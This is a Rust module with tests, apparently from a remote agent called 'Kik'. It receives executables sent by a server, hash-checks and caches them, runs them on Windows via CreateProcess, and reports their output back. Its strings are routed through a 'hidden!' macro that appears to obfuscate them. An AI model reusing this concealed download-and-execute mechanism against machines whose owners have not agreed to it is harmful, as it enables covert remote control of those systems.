//! 命名任务的缓存检查、按需接收和执行入口。命中先确认免传；未命中才分配数据收件箱。
//! 同步任务独立等待本地硬超时；异步只保证创建成功。准备锁在创建进程后释放，缓存保留复用。

use crate::context::Context;
use crate::task_cache::{CacheEntry, IncomingProgram, VerifiedProgram};
use common::{
    channel::{Channel, ChannelAttributeKey},
    file_util::{self, FileRangeRegistration, FileRangeTracker},
    hidden,
    message::{
        dok::Dok,
        kik_frame::KikFrame,
        kik_resp::{kik_error, kik_success_info, KikResp},
    },
    protocol::{self, BufSerializable},
    task::{TaskFrame, TaskSpec},
};
use std::{
    collections::{HashMap, HashSet, VecDeque},
    sync::Arc,
    time::Duration,
};
use tokio::{
    io::AsyncWriteExt,
    sync::{oneshot, Mutex},
    time::{timeout, Instant},
};

/// 当前主连接自己的去重状态。连接换代不复用，活动运行数不设限制。
const ACTIVE: ChannelAttributeKey<Arc<Mutex<RequestState>>> =
    ChannelAttributeKey::new(0x7461_736b_6163_7469);
const RECENT_CAPACITY: usize = 4096;
const RECENT_TTL: Duration = Duration::from_secs(5 * 60);

enum Phase {
    Receiving(oneshot::Sender<()>),
    Abandoned,
    Running,
}

/// 已完成 ID 只保留有界的短期窗口，用于忽略迟到的重复 Prepare。
/// 不承诺缓存淘汰后或跨 Kik 重启去重；服务端不得重发执行请求或复用 ID。
#[derive(Default)]
struct RequestState {
    active: HashMap<String, Phase>,
    recent_ids: HashSet<String>,
    recent_order: VecDeque<(String, Instant)>,
}

impl RequestState {
    fn register(&mut self, id: &str, cancel: oneshot::Sender<()>, now: Instant) -> bool {
        self.expire(now);
        if self.active.contains_key(id) || self.recent_ids.contains(id) {
            return false;
        }
        self.active.insert(id.to_owned(), Phase::Receiving(cancel));
        true
    }

    fn expire(&mut self, now: Instant) {
        while self
            .recent_order
            .front()
            .is_some_and(|(_, ended)| now.duration_since(*ended) >= RECENT_TTL)
        {
            if let Some((id, _)) = self.recent_order.pop_front() {
                self.recent_ids.remove(&id);
            }
        }
    }

    fn finish(&mut self, id: &str, now: Instant) {
        self.active.remove(id);
        self.expire(now);
        if !self.recent_ids.insert(id.to_owned()) {
            return;
        }
        self.recent_order.push_back((id.to_owned(), now));
        while self.recent_order.len() > RECENT_CAPACITY {
            if let Some((old, _)) = self.recent_order.pop_front() {
                self.recent_ids.remove(&old);
            }
        }
    }

    /// 与 abandon 使用同一把短期锁，解决“文件刚收完时放弃”与启动之间的竞争。
    fn begin_execution(&mut self, id: &str) -> bool {
        let Some(phase @ Phase::Receiving(_)) = self.active.get_mut(id) else {
            return false;
        };
        *phase = Phase::Running;
        true
    }

    fn abandon(&mut self, id: &str) {
        let Some(phase @ Phase::Receiving(_)) = self.active.get_mut(id) else {
            return;
        };
        if let Phase::Receiving(cancel) = std::mem::replace(phase, Phase::Abandoned) {
            let _ = cancel.send(());
        }
    }
}

/// 只放弃仍在准备的传输；已经启动的进程不属于传输回收范围。
pub async fn abandon(channel: &Arc<Mutex<Channel>>, id: &str) {
    let state = channel.lock().await.attribute(&ACTIVE).cloned();
    if let Some(state) = state {
        state.lock().await.abandon(id);
    }
}

pub async fn dispatch(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    id: String,
    size: u64,
    hash: [u8; 32],
    spec: TaskSpec,
    file_name: String,
) -> anyhow::Result<()> {
    dispatch_with_cache(context, channel, id, size, hash, spec, async move {
        CacheEntry::acquire(&file_name).await
    })
    .await
}

/// 缓存准备 future 可在测试中使用项目内目录；生产入口只传编译期公钥和系统临时目录。
async fn dispatch_with_cache(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    id: String,
    size: u64,
    hash: [u8; 32],
    spec: TaskSpec,
    cache: impl std::future::Future<Output = anyhow::Result<CacheEntry>> + Send + 'static,
) -> anyhow::Result<()> {
    let active = {
        let mut conn = channel.lock().await;
        if conn.attribute(&ACTIVE).is_none() {
            conn.insert_attribute(&ACTIVE, Arc::new(Mutex::new(RequestState::default())));
        }
        conn.attribute(&ACTIVE)
            .cloned()
            .ok_or_else(|| anyhow::Error::msg(hidden!("任务关联状态不可用")))?
    };
    let (cancel_tx, mut cancel_rx) = oneshot::channel();
    if !active.lock().await.register(&id, cancel_tx, Instant::now()) {
        // 原请求仍在处理，不能发送会抢先结束其等待者的第二个响应。
        return Ok(());
    }
    let context = context.clone();
    tokio::spawn(async move {
        let mut route_registered = false;
        let mut write_failed = false;
        let outcome = async {
            let (entry, candidate) = tokio::select! {
                biased;
                _ = &mut cancel_rx => return Err(anyhow::Error::msg(hidden!("任务传输已放弃"))),
                result = timeout(Duration::from_secs(common::task::PREPARE_SECONDS), async {
                    let entry = cache.await?;
                    let candidate = entry.inspect(size, hash).await?;
                    Ok::<_, anyhow::Error>((entry, candidate))
                }) => result.map_err(|_| anyhow::Error::msg(hidden!("任务缓存准备超时")))??,
            };
            let preparation = if candidate.is_some() {
                TaskFrame::CacheHit(id.clone())
            } else {
                context.register_data_route(&id).await?;
                route_registered = true;
                TaskFrame::Ready(id.clone())
            };
            // 回执不可取消到半帧。写失败后只收尾，不向同一字节流补写另一条结果。
            if let Err(failure) = send_control_frame(&channel, KikFrame::Task(preparation)).await {
                write_failed = true;
                if matches!(failure, ControlSendFailure::Write(_)) {
                    if route_registered {
                        context.remove_data_route(&id).await;
                        route_registered = false;
                    }
                    active.lock().await.finish(&id, Instant::now());
                    channel.lock().await.try_write_half_close().await;
                }
                return Err(anyhow::Error::msg(hidden!("任务准备回执发送失败")));
            }
            let program = if let Some(program) = candidate {
                program
            } else {
                tokio::select! {
                    biased;
                    _ = &mut cancel_rx => return Err(anyhow::Error::msg(hidden!("任务传输已放弃"))),
                    result = timeout(Duration::from_secs(common::task::TRANSFER_SECONDS), async {
                        let incoming = receive(&context, &entry, &id, size).await?;
                        entry.publish(incoming, size, hash).await
                    }) => {
                        result.map_err(|_| anyhow::Error::msg(hidden!("任务程序接收超时")))??
                    }
                }
            };
            if route_registered {
                context.remove_data_route(&id).await;
                route_registered = false;
            }
            if !active.lock().await.begin_execution(&id) {
                return Err(anyhow::Error::msg(hidden!("任务传输已放弃")));
            }
            // 此处到实际进程创建之间不得再插入网络等待；放弃与启动的胜者已经确定。
            execute(program, entry, spec).await
        }
        .await;
        if route_registered {
            context.remove_data_route(&id).await;
        }
        let response = outcome.unwrap_or_else(|error| kik_error(hidden!("任务执行失败: ", error)));
        active.lock().await.finish(&id, Instant::now());
        if !write_failed {
            let _ = send_result(&channel, id, response).await;
        }
    });
    Ok(())
}

async fn send_result(
    channel: &Arc<Mutex<Channel>>,
    id: String,
    response: KikResp,
) -> anyhow::Result<()> {
    match send_control_frame(channel, KikFrame::RespExtra(response, id)).await {
        Ok(()) => Ok(()),
        Err(ControlSendFailure::Closed) => Err(anyhow::Error::msg(hidden!("任务控制连接已关闭"))),
        Err(ControlSendFailure::Write(error)) => {
            // Channel 的关闭等待自身有短时限，关闭失败不能覆盖原始发送错误。
            channel.lock().await.try_write_half_close().await;
            Err(error)
        }
    }
}

/// 已关闭的连接直接拒写，不再重复 shutdown；首次写失败交给调用者在清理资源后关闭。
enum ControlSendFailure {
    Closed,
    Write(anyhow::Error),
}

/// Ready 与最终响应共用写入规则。状态检查和写入持有同一把连接锁，防止其他任务
/// 在检查之后将连接标记失效。放弃传输不能中断这里的半帧写入；写入由 Channel 自身
/// 的超时控制，失败后 Channel 先标记旧流关闭，其他等待者因此直接拒绝复写。
async fn send_control_frame(
    channel: &Arc<Mutex<Channel>>,
    frame: KikFrame,
) -> Result<(), ControlSendFailure> {
    let encoded = protocol::transfer_encode_frame(frame);
    let mut connection = channel.lock().await;
    if connection.is_closed() {
        return Err(ControlSendFailure::Closed);
    }
    connection
        .write_and_flush(&encoded)
        .await
        .map_err(ControlSendFailure::Write)
}

async fn receive(
    context: &Context,
    entry: &CacheEntry,
    id: &str,
    size: u64,
) -> anyhow::Result<IncomingProgram> {
    let mut incoming = entry.incoming().await?;
    let result = async {
        let file = &mut incoming.file;
        file.set_len(size).await?;
        let mut ranges = FileRangeTracker::new(size)?;
        let mut cursor = 0;
        while !ranges.complete() {
            let data = context.read_data(id).await?;
            match Dok::from_buf(data) {
                Some(Dok::FilePart(start, end, bytes)) => {
                    if ranges.register(start, end, bytes.len())? == FileRangeRegistration::New {
                        file_util::write_range(file, &mut cursor, start, end, &bytes).await?;
                    }
                }
                _ => return Err(anyhow::Error::msg(hidden!("任务文件数据错误"))),
            }
        }
        file.flush().await?;
        // publish 会在同一准备锁内复核实际文件长度和 SHA-256，并 sync_all 后才替换。
        // 这里仅负责完整、有界的收件，避免同一暂存文件额外做第三遍全文件摘要。
        Ok::<_, anyhow::Error>(())
    }
    .await;
    result?;
    Ok(incoming)
}

async fn execute(
    program: VerifiedProgram,
    entry: CacheEntry,
    spec: TaskSpec,
) -> anyhow::Result<KikResp> {
    if spec.asynchronous {
        // 与同步任务使用同一条原生 CreateProcess 路径；文件后缀不能触发 shell 或 .exe 补全。
        crate::task_process::start_async(program.path(), &spec)?;
        // CreateProcess 已读取验证过的镜像；运行期由 Windows 镜像映射保护，不再占准备锁。
        drop((program, entry));
        return Ok(kik_success_info(spec.default_content));
    }
    let path = program.path().to_path_buf();
    let output = crate::task_process::run_with_start_guard(&path, &spec, (program, entry)).await?;
    let mut message = String::new();
    if spec.output {
        message.push_str(&output.stdout);
        if !output.stderr.is_empty() {
            message.push_str(&hidden!("\n[stderr]\n"));
            message.push_str(&output.stderr);
        }
        if output.truncated {
            message.push_str(&hidden!("\n[输出已截断或未完整读取]"));
        }
    }
    if output.code != 0 {
        return Ok(kik_error(hidden!(
            "task_exit_failed: exit_code=",
            output.code,
            "\n",
            message
        )));
    }
    if message.is_empty() {
        message = spec.default_content;
    }
    Ok(kik_success_info(message))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::task_cache::testing::{self, Root};
    use bytes::Buf;
    use std::{
        io,
        pin::Pin,
        sync::Mutex as StdMutex,
        task::{Context as PollContext, Poll},
    };
    use tokio::io::AsyncWrite;

    #[derive(Clone, Copy)]
    enum WriteFailure {
        PartialFrame,
        Flush,
        Never,
    }

    #[derive(Default)]
    struct WireEvents {
        bytes: Vec<u8>,
        write_polls: usize,
        flush_polls: usize,
        shutdown_polls: usize,
    }

    /// 真实 Channel 包装的故障写端：只失败一次，随后恢复可写。这样能够发现错误路径
    /// 是否偷偷补写另一条业务帧，而不是靠一个“永久失败”的假流掩盖重复写入。
    struct RecoverableFaultWriter {
        events: Arc<StdMutex<WireEvents>>,
        failure: WriteFailure,
        shutdown_pending: bool,
    }

    impl AsyncWrite for RecoverableFaultWriter {
        fn poll_write(
            self: Pin<&mut Self>,
            _cx: &mut PollContext<'_>,
            bytes: &[u8],
        ) -> Poll<io::Result<usize>> {
            let mut events = self.events.lock().unwrap();
            events.write_polls += 1;
            if matches!(self.failure, WriteFailure::PartialFrame) {
                if events.write_polls == 1 {
                    let size = bytes.len().min(7);
                    events.bytes.extend_from_slice(&bytes[..size]);
                    return Poll::Ready(Ok(size));
                }
                if events.write_polls == 2 {
                    return Poll::Ready(Err(io::Error::new(
                        io::ErrorKind::BrokenPipe,
                        "injected write failure after a frame prefix",
                    )));
                }
            }
            events.bytes.extend_from_slice(bytes);
            Poll::Ready(Ok(bytes.len()))
        }

        fn poll_flush(self: Pin<&mut Self>, _cx: &mut PollContext<'_>) -> Poll<io::Result<()>> {
            let mut events = self.events.lock().unwrap();
            events.flush_polls += 1;
            if matches!(self.failure, WriteFailure::Flush) && events.flush_polls == 1 {
                return Poll::Ready(Err(io::Error::new(
                    io::ErrorKind::BrokenPipe,
                    "injected flush failure",
                )));
            }
            Poll::Ready(Ok(()))
        }

        fn poll_shutdown(self: Pin<&mut Self>, _cx: &mut PollContext<'_>) -> Poll<io::Result<()>> {
            self.events.lock().unwrap().shutdown_polls += 1;
            if self.shutdown_pending {
                Poll::Pending
            } else {
                Poll::Ready(Ok(()))
            }
        }
    }

    fn faulty_channel(
        failure: WriteFailure,
        shutdown_pending: bool,
    ) -> (Arc<Mutex<Channel>>, Arc<StdMutex<WireEvents>>) {
        let events = Arc::new(StdMutex::new(WireEvents::default()));
        let mut channel = Channel::new(
            Box::pin(RecoverableFaultWriter {
                events: events.clone(),
                failure,
                shutdown_pending,
            }),
            Some("task-failure-test".into()),
            common::channel::ChannelType::Kik,
            Err(io::Error::other("test")),
            Err(io::Error::other("test")),
        );
        channel.set_write_timeout(Duration::from_millis(20));
        (Arc::new(Mutex::new(channel)), events)
    }

    async fn wait_dispatch_cleanup(channel: &Arc<Mutex<Channel>>, id: &str) {
        timeout(Duration::from_secs(1), async {
            loop {
                let state = channel.lock().await.attribute(&ACTIVE).cloned().unwrap();
                let finished = {
                    let state = state.lock().await;
                    !state.active.contains_key(id) && state.recent_ids.contains(id)
                };
                if finished {
                    break;
                }
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("failed Ready did not release its active task state");
    }

    async fn captured_frames(events: &Arc<StdMutex<WireEvents>>, count: usize) -> Vec<KikFrame> {
        captured_frames_with_budget(events, count, Duration::from_secs(5)).await
    }

    fn complete_captured_frames(events: &Arc<StdMutex<WireEvents>>) -> Vec<KikFrame> {
        let mut bytes = bytes::BytesMut::from(events.lock().unwrap().bytes.as_slice());
        let mut frames = Vec::new();
        while bytes.len() >= 4 {
            let len = bytes.get_u32() as usize;
            if bytes.len() < len {
                break;
            }
            frames.push(KikFrame::from_buf(bytes.split_to(len)).unwrap());
        }
        frames
    }

    async fn captured_frames_with_budget(
        events: &Arc<StdMutex<WireEvents>>,
        count: usize,
        budget: Duration,
    ) -> Vec<KikFrame> {
        let started = Instant::now();
        let result = timeout(budget, async {
            loop {
                let frames = complete_captured_frames(events);
                if frames.len() >= count {
                    return frames;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await;
        match result {
            Ok(frames) => frames,
            Err(_) => {
                // 只报告计数，便于区分“尚未完成准备”和“已回执但执行未完成”，不打印帧内容。
                let received = complete_captured_frames(events).len();
                let events = events.lock().unwrap();
                panic!(
                    "task response was not bounded: expected_frames={count}, complete_frames={received}, captured_bytes={}, write_polls={}, flush_polls={}, elapsed={:?}, budget={budget:?}",
                    events.bytes.len(), events.write_polls, events.flush_polls, started.elapsed()
                );
            }
        }
    }

    fn simple_spec() -> TaskSpec {
        TaskSpec {
            asynchronous: false,
            output: false,
            timeout_seconds: 5,
            args: vec![],
            default_content: "latest task configuration".into(),
        }
    }

    #[tokio::test]
    async fn same_named_tasks_reuse_cached_bytes_and_execute_each_latest_spec_without_parts() {
        let root = Root::new();
        let entry = root.acquire(testing::file_name(41, "exe")).await.unwrap();
        let bytes = std::fs::read(std::env::current_exe().unwrap()).unwrap();
        drop(testing::publish(&entry, &bytes).await);
        drop(entry);
        // 服务端的任务名称不传给 Kik；两个独立请求使用相同最终名时共享缓存，但配置独立。
        for (request_id, response) in [
            ("named-shared-task-first", "named-task-first-response"),
            ("named-shared-task-second", "named-task-updated-response"),
        ] {
            let context = Context::new();
            // 预占相同 ID：命中分支若误注册或误删除数据路由，下面两个断言至少一个失败。
            context.register_data_route(request_id).await.unwrap();
            context
                .send_data((request_id.into(), bytes::BytesMut::from(&b"keep route"[..])))
                .await
                .unwrap();
            let (channel, events) = faulty_channel(WriteFailure::Never, false);
            let mut spec = simple_spec();
            spec.args = vec!["--list".into()];
            spec.default_content = response.into();
            dispatch_with_cache(
                &context,
                channel,
                request_id.into(),
                bytes.len() as u64,
                testing::hash(&bytes),
                spec,
                root.acquire(testing::file_name(41, "exe")),
            )
            .await
            .unwrap();
            // 本用例还会散列真实测试 EXE 并调用 CreateProcess；准备、5 秒运行与收尾
            // 不能共用一个 5 秒观察窗口。保留有界等待和下方业务断言，不放宽生产时限。
            let frames = captured_frames_with_budget(&events, 2, Duration::from_secs(30)).await;
            assert!(
                matches!(&frames[0], KikFrame::Task(TaskFrame::CacheHit(id)) if id == request_id)
            );
            assert!(
                matches!(&frames[1], KikFrame::RespExtra(KikResp::Success(common::message::kik_resp::ClientSuccessResp::Info(content)), id) if id == request_id && content == response)
            );
            assert_eq!(
                context.read_data(request_id).await.unwrap(),
                b"keep route"[..]
            );
        }
    }

    #[tokio::test]
    async fn damaged_cache_requests_transfer_and_never_runs_previous_bytes() {
        let root = Root::new();
        let entry = root.acquire(testing::file_name(42, "exe")).await.unwrap();
        let program = testing::publish(&entry, b"old!").await;
        let path = program.path().to_path_buf();
        drop((program, entry));
        let context = Context::new();
        let (channel, events) = faulty_channel(WriteFailure::Never, false);
        dispatch_with_cache(
            &context,
            channel.clone(),
            "task-cache-corruption-replace-check".into(),
            4,
            testing::hash(b"new!"),
            simple_spec(),
            root.acquire(testing::file_name(42, "exe")),
        )
        .await
        .unwrap();
        let frames = captured_frames(&events, 1).await;
        assert!(
            matches!(&frames[0], KikFrame::Task(TaskFrame::Ready(id)) if id == "task-cache-corruption-replace-check")
        );
        context
            .send_data((
                "task-cache-corruption-replace-check".into(),
                Dok::FilePart(0, 3, bytes::BytesMut::from(&b"new!"[..])).to_buf(),
            ))
            .await
            .unwrap();
        let frames = captured_frames(&events, 2).await;
        assert!(
            matches!(&frames[1], KikFrame::RespExtra(KikResp::Error(_, _), id) if id == "task-cache-corruption-replace-check")
        );
        assert_eq!(std::fs::read(path).unwrap(), b"new!");
        context
            .register_data_route("task-cache-corruption-replace-check")
            .await
            .unwrap();
        context
            .remove_data_route("task-cache-corruption-replace-check")
            .await;
    }

    #[tokio::test]
    async fn abandon_during_cache_lock_wait_never_acknowledges_or_starts() {
        let root = Root::new();
        let owner = root.acquire(testing::file_name(43, "exe")).await.unwrap();
        let context = Context::new();
        let (channel, events) = faulty_channel(WriteFailure::Never, false);
        dispatch_with_cache(
            &context,
            channel.clone(),
            "cancel-lock".into(),
            1,
            [0; 32],
            simple_spec(),
            root.acquire(testing::file_name(43, "exe")),
        )
        .await
        .unwrap();
        abandon(&channel, "cancel-lock").await;
        let frames = captured_frames(&events, 1).await;
        assert_eq!(frames.len(), 1);
        assert!(
            matches!(&frames[0], KikFrame::RespExtra(KikResp::Error(_, content), id) if id == "cancel-lock" && content.contains("已放弃"))
        );
        drop(owner);
        timeout(
            Duration::from_secs(1),
            root.acquire(testing::file_name(43, "exe")),
        )
        .await
        .unwrap()
        .unwrap();
    }

    #[tokio::test]
    async fn abandon_after_ready_cleans_incoming_and_preserves_existing_cache() {
        let root = Root::new();
        let entry = root.acquire(testing::file_name(46, "exe")).await.unwrap();
        let program = testing::publish(&entry, b"old!").await;
        let path = program.path().to_path_buf();
        let directory = path.parent().unwrap().to_path_buf();
        drop((program, entry));
        let context = Context::new();
        let (channel, events) = faulty_channel(WriteFailure::Never, false);
        dispatch_with_cache(
            &context,
            channel.clone(),
            "cancel-receive".into(),
            4,
            testing::hash(b"new!"),
            simple_spec(),
            root.acquire(testing::file_name(46, "exe")),
        )
        .await
        .unwrap();
        assert!(matches!(
            &captured_frames(&events, 1).await[0],
            KikFrame::Task(TaskFrame::Ready(_))
        ));
        let incoming_path = timeout(Duration::from_secs(2), async {
            loop {
                if let Some(path) = std::fs::read_dir(&directory)
                    .unwrap()
                    .filter_map(Result::ok)
                    .map(|item| item.path())
                    .find(|path| {
                        path.file_name()
                            .and_then(|name| name.to_str())
                            .is_some_and(|name| name.ends_with(".temp"))
                    })
                {
                    break path;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await
        .unwrap();
        abandon(&channel, "cancel-receive").await;
        assert!(
            matches!(&captured_frames(&events, 2).await[1], KikFrame::RespExtra(KikResp::Error(_, content), _) if content.contains("已放弃"))
        );
        timeout(Duration::from_secs(3), async {
            while incoming_path.exists() {
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .unwrap();
        assert_eq!(std::fs::read(path).unwrap(), b"old!");
        context.register_data_route("cancel-receive").await.unwrap();
        context.remove_data_route("cancel-receive").await;
    }

    #[tokio::test]
    async fn failed_cache_hit_ack_never_starts_or_writes_a_result() {
        let root = Root::new();
        let entry = root.acquire(testing::file_name(44, "exe")).await.unwrap();
        drop(testing::publish(&entry, b"invalid native image").await);
        drop(entry);
        let context = Context::new();
        context.register_data_route("ack-fail").await.unwrap();
        context
            .send_data(("ack-fail".into(), bytes::BytesMut::from(&b"unrelated"[..])))
            .await
            .unwrap();
        let (channel, events) = faulty_channel(WriteFailure::PartialFrame, false);
        dispatch_with_cache(
            &context,
            channel.clone(),
            "ack-fail".into(),
            20,
            testing::hash(b"invalid native image"),
            simple_spec(),
            root.acquire(testing::file_name(44, "exe")),
        )
        .await
        .unwrap();
        wait_dispatch_cleanup(&channel, "ack-fail").await;
        let expected =
            protocol::transfer_encode_frame(KikFrame::Task(TaskFrame::CacheHit("ack-fail".into())));
        {
            let state = events.lock().unwrap();
            assert_eq!(state.bytes, expected[..7]);
            assert_eq!(state.write_polls, 2);
        }
        assert_eq!(
            context.read_data("ack-fail").await.unwrap(),
            b"unrelated"[..]
        );
    }

    #[tokio::test]
    async fn failed_ready_never_writes_a_result_and_releases_its_route() {
        // 同时覆盖 write_all 只写出前缀、完整 write_all 后 flush 报错两种真实写入失败。
        for failure in [WriteFailure::PartialFrame, WriteFailure::Flush] {
            let root = Root::new();
            let context = Context::new();
            context.register_data_route("unrelated").await.unwrap();
            context
                .send_data((
                    "unrelated".into(),
                    bytes::BytesMut::from(&b"task-test-unrelated-payload-sc002"[..]),
                ))
                .await
                .unwrap();
            let (channel, events) = faulty_channel(failure, false);
            let id = "failed-ready";
            dispatch_with_cache(
                &context,
                channel.clone(),
                id.into(),
                1,
                [0; 32],
                TaskSpec {
                    asynchronous: false,
                    output: false,
                    timeout_seconds: 1,
                    args: vec![],
                    default_content: "unused".into(),
                },
                root.acquire(testing::file_name(40, "exe")),
            )
            .await
            .unwrap();
            wait_dispatch_cleanup(&channel, id).await;
            assert!(channel.lock().await.is_closed());
            // 活动接收路由若还存在，同 ID 再次登记必须失败；同时证明没有误删其他路由。
            context.register_data_route(id).await.unwrap();
            context.remove_data_route(id).await;
            assert_eq!(
                context.read_data("unrelated").await.unwrap(),
                b"task-test-unrelated-payload-sc002"[..]
            );

            let expected =
                protocol::transfer_encode_frame(KikFrame::Task(TaskFrame::Ready(id.into())));
            let events = events.lock().unwrap();
            assert_eq!(events.shutdown_polls, 1);
            match failure {
                WriteFailure::PartialFrame => {
                    assert_eq!(events.write_polls, 2);
                    assert_eq!(events.flush_polls, 0);
                    assert_eq!(events.bytes, expected[..7]);
                }
                WriteFailure::Flush => {
                    assert_eq!(events.write_polls, 1);
                    assert_eq!(events.flush_polls, 1);
                    assert_eq!(events.bytes.as_slice(), expected.as_ref());
                }
                WriteFailure::Never => unreachable!(),
            }
        }
    }

    #[tokio::test]
    async fn failed_result_closes_the_stream_and_closed_stream_never_rewrites() {
        let (channel, events) = faulty_channel(WriteFailure::PartialFrame, false);
        let response = kik_success_info("finished".into());
        assert!(send_result(&channel, "result-1".into(), response)
            .await
            .is_err());
        assert!(channel.lock().await.is_closed());
        let after_failure = {
            let events = events.lock().unwrap();
            assert_eq!(events.write_polls, 2);
            assert_eq!(events.shutdown_polls, 1);
            events.bytes.clone()
        };
        assert!(send_result(
            &channel,
            "result-2".into(),
            kik_error("task-test-late-result-sc002".into()),
        )
        .await
        .is_err());
        let events = events.lock().unwrap();
        assert_eq!(events.bytes, after_failure);
        assert_eq!(events.write_polls, 2);
        assert_eq!(events.shutdown_polls, 1);
    }

    #[tokio::test]
    async fn failed_result_keeps_closed_state_when_shutdown_does_not_finish() {
        let (channel, events) = faulty_channel(WriteFailure::Flush, true);
        let result = timeout(
            Duration::from_secs(1),
            send_result(&channel, "result".into(), kik_success_info("done".into())),
        )
        .await
        .expect("shutdown prevented bounded failure cleanup");
        assert!(result.is_err());
        assert!(channel.lock().await.is_closed());
        assert!(events.lock().unwrap().shutdown_polls > 0);
    }

    #[test]
    fn duplicate_prepare_is_ignored_while_running_and_after_response() {
        let mut state = RequestState::default();
        let now = Instant::now();
        assert!(state.register("one", oneshot::channel().0, now));
        assert!(!state.register("one", oneshot::channel().0, now));
        assert!(state.begin_execution("one"));
        assert!(!state.register("one", oneshot::channel().0, now));
        state.finish("one", now);
        assert!(!state.register("one", oneshot::channel().0, now));
        // 新的主连接没有旧连接的去重记录，不引入持久任务身份。
        assert!(RequestState::default().register("one", oneshot::channel().0, now));
    }

    #[test]
    fn abandon_only_wins_before_execution_commit() {
        let mut state = RequestState::default();
        let (cancel, mut receive) = oneshot::channel();
        assert!(state.register("receiving", cancel, Instant::now()));
        state.abandon("receiving");
        assert!(receive.try_recv().is_ok());
        assert!(!state.begin_execution("receiving"));

        assert!(state.register("running", oneshot::channel().0, Instant::now()));
        assert!(state.begin_execution("running"));
        state.abandon("running");
        assert!(matches!(state.active.get("running"), Some(Phase::Running)));
    }

    #[test]
    fn recent_cache_is_bounded_and_expiry_does_not_remove_active_processes() {
        let mut state = RequestState::default();
        let now = Instant::now();
        assert!(state.register("still-running", oneshot::channel().0, now));
        assert!(state.begin_execution("still-running"));
        for value in 0..RECENT_CAPACITY + 10 {
            state.finish(&value.to_string(), now);
        }
        assert_eq!(state.recent_ids.len(), RECENT_CAPACITY);
        assert_eq!(state.recent_order.len(), RECENT_CAPACITY);
        assert!(!state.recent_ids.contains("0"));
        state.expire(now + RECENT_TTL);
        assert!(state.recent_ids.is_empty());
        assert!(state.recent_order.is_empty());
        assert!(matches!(
            state.active.get("still-running"),
            Some(Phase::Running)
        ));
    }
}
